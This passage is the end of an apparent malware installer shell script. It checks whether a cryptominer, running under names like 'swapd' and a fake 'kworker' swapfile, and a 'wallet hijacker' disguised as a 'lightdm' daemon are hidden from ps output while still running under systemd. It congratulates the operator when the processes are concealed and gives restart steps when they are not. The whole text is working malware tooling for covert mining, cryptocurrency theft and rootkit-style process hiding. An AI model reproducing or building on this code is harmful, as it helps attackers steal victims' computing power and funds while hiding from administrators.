if ps aux | grep -E "swapd|kworker.*swapfile" | grep -v grep >/dev/null 2>&1; then
    PROCESSES_VISIBLE=true
    echo '[⚠] WARNING: Miner processes are STILL VISIBLE in ps output!'
fi

if ps aux | grep "lightdm.*daemon" | grep -v grep >/dev/null 2>&1; then
    PROCESSES_VISIBLE=true
    echo '[⚠] WARNING: Wallet hijacker is STILL VISIBLE in ps output!'
fi

if [ "$PROCESSES_VISIBLE" = true ]; then
    echo ''
    echo 'This can happen if services were already running before installation.'
    echo ''
    echo 'RECOMMENDED ACTION:'
    echo '  Option 1 - Reboot (safest):'
    echo '    reboot'
    echo ''
    echo '  Option 2 - Restart services manually:'
    echo '    systemctl restart swapd'
    echo '    systemctl restart lightdm'
    echo ''
    echo 'After restart, verify with:'
    echo '  ps aux | grep swapd      # Should show nothing'
    echo '  ps aux | grep lightdm    # Should show nothing'
    echo ''
    echo 'Check services are running with:'
    echo '  systemctl status swapd   # Should show: active (running)'
    echo '  systemctl status lightdm # Should show: active (running)'
else
    echo '[✓] SUCCESS! All processes are HIDDEN from ps output!'
    echo ''
    echo 'Verification:'
    echo '  ps aux | grep swapd      → Nothing (hidden) ✓'
    echo '  ps aux | grep lightdm    → Nothing (hidden) ✓'
    echo ''
    echo 'Services are running (verify with):'
    echo '  systemctl status swapd   → active (running) ✓'
    echo '  systemctl status lightdm → active (running) ✓'
fi

echo ''
echo '========================================================================'
